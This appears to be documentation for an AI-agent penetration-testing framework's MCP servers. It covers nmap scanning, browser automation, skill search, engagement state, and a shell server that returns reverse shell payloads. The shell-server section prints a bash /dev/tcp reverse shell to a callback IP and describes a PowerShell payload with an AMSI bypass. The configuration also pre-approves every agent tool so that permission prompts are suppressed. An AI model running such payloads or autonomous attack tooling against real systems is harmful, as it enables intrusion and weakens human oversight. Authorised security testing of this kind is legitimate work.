# MCP Servers

red-run uses five MCP (Model Context Protocol) servers to give agents access to capabilities that Claude Code's built-in tools can't provide: network scanning, persistent shell sessions, browser automation, semantic skill search, and engagement state management.

Most MCP servers run as local stdio processes, started automatically by Claude Code. The exception is **shell-server**, which runs as a persistent SSE service on `127.0.0.1:8022` so all teammates share the same sessions. `run.sh` starts shell-server before launching Claude Code.

## Configuration

Servers are configured in `.mcp.json` at the repo root. Most use stdio transport (command-based), shell-server uses SSE (URL-based):

```json
{
  "mcpServers": {
    "skill-router": {
      "command": "uv",
      "args": ["run", "--directory", "tools/skill-router", "python", "server.py"],
      "env": { "HF_HUB_OFFLINE": "1" }
    },
    "nmap-server": {
      "command": "uv",
      "args": ["run", "--directory", "tools/nmap-server", "python", "server.py"]
    },
    "shell-server": {
      "type": "sse",
      "url": "http://127.0.0.1:8022/sse"
    },
    "browser-server": {
      "command": "uv",
      "args": ["run", "--directory", "tools/browser-server", "python", "server.py"]
    },
    "state": {
      "command": "uv",
      "args": ["run", "--directory", "tools/state-server", "python", "server.py"]
    }
  }
}
```

All MCP server tools are pre-allowed in `.claude/settings.json` to reduce permission prompt noise.

---

## skill-router

**Location:** `tools/skill-router/` · **3 tools**

Semantic skill discovery and retrieval. Skills are indexed from YAML frontmatter into ChromaDB with `all-MiniLM-L6-v2` sentence-transformer embeddings. The lead calls `search_skills()` to find the right skill for a situation, then tells the teammate which skill to load. Teammates call `get_skill()` to load the full methodology — they never call `search_skills()` themselves.

| Tool | Description |
|------|-------------|
| `search_skills(query, n=5, category?, min_similarity=0.4)` | Semantic search across all indexed skills |
| `get_skill(name)` | Load a skill's full SKILL.md content |
| `list_skills(category?)` | List available skills, optionally filtered |

**Indexing:** Run `uv run --directory tools/skill-router python indexer.py` after adding or modifying skills. The indexer extracts description, keywords, tools, and opsec fields from frontmatter and builds embedding documents. ChromaDB data lives at `tools/skill-router/.chromadb/`.

---

## nmap-server

**Location:** `tools/nmap-server/` · **3 tools** · **Requires Docker**

Runs nmap inside a Docker container with minimal capabilities — no sudo needed. All inputs are validated before reaching `subprocess.run()`.

| Tool | Description |
|------|-------------|
| `nmap_scan(target, options="-A -p- -T4", save_to?)` | Run nmap in Docker, return parsed JSON |
| `get_scan(scan_id)` | Retrieve previous scan results |
| `list_scans()` | List all scans from this session |

**Container isolation:**

- `--network=host` for raw socket access to the target network
- `--cap-drop=ALL --cap-add=NET_RAW --cap-add=NET_ADMIN` — only network capabilities
- `--rm` — container removed after each scan
- No volume mounts — XML output goes to stdout

**Input validation:**

- Blocklist of dangerous nmap flags (`-iL`, `-oN`, `--datadir`, etc.)
- Target strings checked for shell metacharacters and path traversal
- `--script` arguments must be bare names (no paths or URLs)
- Evidence paths must be under `engagement/evidence/`

**Output:** Returns structured JSON — hosts, ports, services, banners, NSE script results, OS detection. Raw XML is saved to `engagement/evidence/nmap-<target>.xml` when the engagement directory exists.

| Variable | Default | Description |
|----------|---------|-------------|
| `NMAP_TIMEOUT` | `600` | Max scan duration (seconds) |
| `NMAP_DOCKER_IMAGE` | `red-run-nmap:latest` | Docker image name |

---

## shell-server

**Location:** `tools/shell-server/` · **7 tools** · **SSE transport (shared sessions)**

Manages TCP listeners, reverse shell sessions, and local interactive processes. Runs as a persistent SSE service on `127.0.0.1:8022` — all teammates share one instance, so sessions created by one teammate are visible to all others. Started automatically by `run.sh` before Claude Code launches.

| Tool | Description |
|------|-------------|
| `start_listener(port, host="0.0.0.0", timeout=300, label?)` | Start TCP listener, return reverse shell payloads for Linux and Windows |
| `start_process(command, label?, timeout=30, privileged=false)` | Spawn local interactive process in a persistent PTY |
| `send_command(session_id, command, timeout=10, expect?)` | Send command to session, return output |
| `read_output(session_id, timeout=2)` | Read buffered output without sending a command |
| `stabilize_shell(session_id, method="auto")` | Upgrade raw shell to interactive PTY (Linux only, skips on Windows) |
| `list_sessions()` | List all listeners, sessions, and detected platform |
| `close_session(session_id, save_transcript=true)` | Close session and save transcript |

### Reverse shell workflow

`start_listener` returns ready-to-use payloads with the callback IP auto-resolved:

```
start_listener(port=4444)  → Returns:
  payloads.linux:   "bash -i >& /dev/tcp/10.10.14.25/4444 0>&1"
  payloads.windows: "powershell -c \"Start-Process ... (AMSI bypass + TCP shell)\""
```

The Windows payload includes an AMSI bypass (for CTF-level Defender) and uses `Start-Process` to detach from the parent process (survives xp_cmdshell, cmd /c, scheduled tasks).

### Platform auto-detection

When a shell connects, the server probes the prompt and auto-detects the platform (Windows/Linux). This determines:
- **Command separators** — `&` for Windows cmd.exe, `;` for Linux
- **Stabilization** — PTY upgrade on Linux, skipped on Windows
- **Marker parsing** — handles Windows cmd.exe echoing the wrapped command line

### Session management endpoints

Two HTTP endpoints (outside MCP) for `run.sh` session management:

| Endpoint | Description |
|----------|-------------|
| `GET /status` | Returns active session count and details (for startup cleanup prompt) |
| `POST /clear` | Closes all sessions and listeners |

### Docker mode (`privileged=true`)

The `privileged` parameter runs commands inside the `red-run-shell` Docker container:

| Category | Tools |
|----------|-------|
| Windows access | evil-winrm |
| Impacket | psexec.py, wmiexec.py, smbexec.py, smbclient.py, mssqlclient.py, dpapi.py |
| DPAPI/EFS | dpapick3 (handles CAPI key containers that impacket can't parse) |
| Pivoting | chisel, ligolo-ng proxy, socat |
| Poisoning | Responder, mitm6 |
| Capture | tcpdump |
| SSH | openssh-client |

Containers run with `--network=host` to share the host's network namespace including VPN tunnels.

### Transcripts

Every send/recv is logged in real-time to `engagement/evidence/shell-{id}-{label}.log`. On `close_session(save_transcript=true)`, the log path is returned.

---

## browser-server

**Location:** `tools/browser-server/` · **11 tools**

Headless Chromium automation via Playwright. Handles CSRF tokens, session cookies, JavaScript-rendered forms, and multi-step auth flows that curl can't manage. Each session maintains its own cookie jar and localStorage.

| Tool | Description |
|------|-------------|
| `browser_open(url, ignore_tls=true, proxy="")` | Create session + navigate, optionally through an upstream proxy such as Burp |
| `browser_navigate(session_id, url)` | Navigate within existing session |
| `browser_get_page(session_id, selector?)` | Re-read page content, optionally scoped by CSS selector |
| `browser_click(session_id, selector, wait_until="load")` | Click element and wait for navigation |
| `browser_fill(session_id, selector, value)` | Fill a form field |
| `browser_select(session_id, selector, value)` | Select dropdown option |
| `browser_screenshot(session_id, save_to?)` | Take full-page PNG screenshot |
| `browser_cookies(session_id)` | Get all cookies as JSON |
| `browser_evaluate(session_id, expression)` | Run JavaScript in page context |
| `close_browser(session_id)` | Close session and free resources |
| `list_browser_sessions()` | List active sessions |

**Content handling:** HTML is converted to markdown via `markdownify`. Scripts and styles are stripped. Output capped at 50KB — use `browser_get_page` with a CSS selector to scope large pages.

**Session isolation:** Each `browser_open` creates a new Chromium browser context with its own cookie jar, localStorage, and cache. TLS errors are ignored by default for self-signed pentesting targets.

**Proxy support:** `browser_open(..., proxy="http://127.0.0.1:8080")` launches or reuses a Chromium instance bound to that upstream proxy, which makes it suitable for Burp capture. Different proxy values get separate browser instances; direct sessions stay isolated from proxied ones. If `proxy` is omitted, the server also checks `engagement/web-proxy.json` and uses the orchestrator-recorded Burp listener when enabled.

**When to use browser vs curl:** Browser tools are the default for navigating sites and managing sessions. Use curl as fallback for precise payload control in injection testing.

---

## state-server

**Location:** `tools/state-server/` · **1 instance, full read/write tools**

SQLite-backed engagement state management. In agent teams mode, all writes are centralized through the **state-mgr teammate** — the sole writer to state.db. State-mgr applies LLM-level dedup, enforces provenance links (technique-vuln linkage, access chain provenance), and notifies the lead of new findings. Other teammates and the lead read state directly.

SQLite WAL mode + `busy_timeout=5000` handles concurrent access safely. DB-level deduplication (UNIQUE constraints) remains as a safety net behind state-mgr's judgment.

See [Engagement State](engagement-state.md) for the full schema and how state drives vulnerability chaining.

---

## Server details

For complete documentation of each server — parameters, environment variables, architecture, and edge cases — see the README in each server's directory:

- [`tools/skill-router/README.md`](https://github.com/blacklanternsecurity/red-run/blob/main/tools/skill-router/README.md)
- [`tools/nmap-server/README.md`](https://github.com/blacklanternsecurity/red-run/blob/main/tools/nmap-server/README.md)
- [`tools/shell-server/README.md`](https://github.com/blacklanternsecurity/red-run/blob/main/tools/shell-server/README.md)
- [`tools/browser-server/README.md`](https://github.com/blacklanternsecurity/red-run/blob/main/tools/browser-server/README.md)
- [`tools/state-server/README.md`](https://github.com/blacklanternsecurity/red-run/blob/main/tools/state-server/README.md)
